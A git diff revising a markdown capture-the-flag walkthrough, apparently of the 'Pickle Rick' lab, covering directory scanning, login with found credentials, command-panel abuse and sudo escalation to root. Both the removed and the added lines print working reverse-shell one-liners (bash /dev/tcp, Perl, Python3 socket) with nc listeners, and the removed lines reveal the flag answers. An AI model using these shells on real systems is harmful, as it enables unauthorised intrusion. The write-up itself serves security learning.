@@ -53,13 +53,16 @@ dir: Specifies that we want to perform directory brute-forcing.
 
 -o buster.txt: The -o flag specifies the output file where the results will be saved. In this case, it saves the output to a file named “buster.txt.”
 
-We found two juicy directories:
+We found two interesting directories:
+
 ![buster](https://github.com/user-attachments/assets/005f3530-538e-4fb7-a809-9c0379e1e99b)
 
 ```bash
 /login.php
 /robots.txt
 ```
+
+Robots.txt can often reveal vulnerabilities in a web server, or inadvertently leaked information. 
 Let's also run a nikto scan on the target IP:
 
 ```bash
@@ -67,161 +70,122 @@ nikto -h $ip | tee nikto.txt
 ```
 Command break down:
 -h $ip: The -h option specifies the target host
+
 | tee nikto.txt: The tee command allows you to save the output to a file (nikto.txt) 
+
 ![nikto](https://github.com/user-attachments/assets/2be2bf43-af1f-4a72-929a-76fdcbce784f)
 
 This again reveals the /login.php directory among other information.
 
-Browsing to /login.php , we are redirect to a log in page :
+Browsing to /login.php , we are redirected to a log in page :
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2cc435b8-98c2-4a31-a765-4ed3bf419ef2/Untitled.png)
+![login](https://github.com/user-attachments/assets/8ffd221c-cca9-4f8e-bee7-36c19203e518)
 
-Browsing to /robots.txt , we are redirect to a html page with this word (We assume it's the passowrd):
+Navigating to robots.txt reveals a strange word that looks like it might be a login password.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/764766a5-6642-47fa-bc16-76487e4cf2f0/Untitled.png)
-
-Credential :
-
-Username: **R1ckRul3s**
-
-Password: xxxxxxxxxxx
+Let's try logging in with the username we found earlier from the sourcecode and the potential password from robots.txt.
 
 # Gaining privileges
 
-We go back to {IP}/login.phop  and i use as Username: **R1ckRul3s and as** Password: xxxxxxxxxxx
+Success! We are now logged in!
 
-We can successfully log in: 
+We are presented with a command panel. 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c5cc2faf-1fb8-46e7-988a-43de3d52ec71/Untitled.png)
-
-We're presente with a command pannel:
-
-Running the command 
+Running the command id reveals that we are www-data:
 
 ```bash
-ls
+id
 ```
+![id](https://github.com/user-attachments/assets/3366d92d-5891-44e8-8dce-2f462c7998d9)
 
-we can see all the above showed assets , trying to 
+Now, let's run ls -la to see what files are available: 
 
 ```bash
-cat
+ls -la
 ```
+![ls -la](https://github.com/user-attachments/assets/ec5f253e-5e29-4132-afb8-42615a23012e)
 
-these file, will results in 
+Let's run the cat command on clue.txt:
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23064ade-f915-459b-91d5-010f9b8c40ec/Untitled.png)
+![cat](https://github.com/user-attachments/assets/5a99da24-b9ab-430f-8347-eaf843b8b82e)
+
+The cat command is disabled. Let's try some other commands with similiar functionality to cat, like less. 
+less works and the contents display: Look around the file system for the other ingredient.
+Ok, let's run less on Sup3rS3cretPickl3Ingred.txt.
+And this returns our first secret ingredient!
 
 # Expolitation
 
-We need to use a shell, in order to gain privileges in the victimes envirolment:
-
-As main resources i used [https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/)
-
-1st attempt:
-
-****Reverse Shell- Bash shell****
-
-Following the documentation on the Attacker machine i opened the port 8080 to listen
+Let's try to get more access to this web server with a reverse shell. 
+As a test, let's run a simple python command:
 
 ```bash
-nc -lvp 8080
+python3 -c 'print("test")'
 ```
+The command works and displayed test. This let's us know that we can run python3 commands. So, let's try running a reverse shell in python3. 
+I often like to use the site "https://www.revshells.com/" because it has a large colletion of reverse shell, with a simple interface to input 
+your IP and desired port number, as well as showing the nc listener.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/557467c1-42c4-4413-b59b-425c731a7a52/Untitled.png)
+Scroll down on through the list of reverse shells on the bottom left until you get to Python3 shortest. In our situation with the command panel,
+I find that shorter shells tend to have a high success rate.
 
-On the Victim machine i run the  command:
+Shell for input on command panel:
 
 ```bash
-bash -i >& /dev/tcp/xx.xx.xx.xx/8080 0>&1
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.24.123",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
-## Nothin happen, Test failed
+nc listener for output on our terminal:
+```bash
+nc -lvnp 4444
+```
 
-2ndAttempt
+Alright! We have a reverse shell as www-data! Let's run the command env to get a summary of environmental varialbles:
 
-****Reverse Shell- Perl shell****
+![env](https://github.com/user-attachments/assets/fc127f2a-363d-4178-9f22-c83e649baa39)
 
-Following the documentation on the Attacker machine i opened the port 8080 to listen
+Ok, the first thing I like to do is run a few commands to upgrade our shell's functionality and stability:
 
 ```bash
-nc -lvp 1234
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl -z
+stty raw -echo; fg
+stty rows 38 columns 116
 ```
 
-On the Victim machine i run the  command:
+Now that we have upgraded the shell, let's check for privileges of www-data:
 
+Command:
 ```bash
-perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+sudo -l
 ```
+![sudo -l](https://github.com/user-attachments/assets/19ce7691-b99e-4672-b0db-c1f42841d650)
 
-We gain access to the machine:
-
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df773578-cceb-4bb0-81aa-5ec70742539b/Untitled.png)
-
-Browsing the file system , now we can 
-
+This is great news as it indicates we can execute any command with no password!
+Let's explore the file system and get the other flags. First, let's check the home directory:
+Command:
 ```bash
-cat "Sup3rS3cretPickl3Ingred.txt"
+ls /home
 ```
-
-### The First ingredients is : mr meeseek hair
-
-When i 
-
-```bash
-pwd
-```
-
-it return 
-
-```bash
-pwd
-var/www/html
-```
-
-The current user is :  www-data
-
-going back in the folder hierarchy i go to 
-
-```bash
-/home
-```
-
-I can see:
-
-```bash
-rick 
-ubunutu
-```
-
-I want to explore rick folder:
-
+We see two directories in home: rick and ubuntu. Now, we'll navigate to /home/rick.
+Command:
 ```bash
 cd /home/rick
+ls -lah
 ```
 
-we found the second ingredients is Jerry Tear
+Great! Let's use less to see the contents of the 2nd ingredient, don't forget to use '' due to the space.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f8be9229-9436-4f9c-a0c1-f03a818f97c7/Untitled.png)
 
-At this point i want to access the root folder and gain full privileges.
+![2nd](https://github.com/user-attachments/assets/da82fe39-0967-4c92-a433-042f5c4d7539)
 
-I tried with 
-
+We now have the second ingredient! 
+Let's check the root directory for the 3rd one. A couple things to note. We will need to use the sudo command with no pasword to display the 3rd flag. I also noticed that we actually can use the cat command in our shell.
 ```bash
-sudo su 
+sudo ls /root
+sudo cat /root/3rd.txt
 ```
 
-Luckly it work, by acceding the root folder 
+And we now have the 3rd flag! I hope you enjoyed this CTF and it was a good learning experience. Remember that there are different approaches that you can take in the room to get the same results, so try some different approaches and techniques. 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6a48134a-1a8b-4992-a10f-57381559a96e/Untitled.png)
-
-In the /root folder wel'’find the 3rd ingredient :
-
-```bash
-cat 3rd.txt
-```
-
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3dced013-95e7-4aca-b82b-929c7885cc14/Untitled.png)
-
-The 3rd ingredients is fleeb Juice
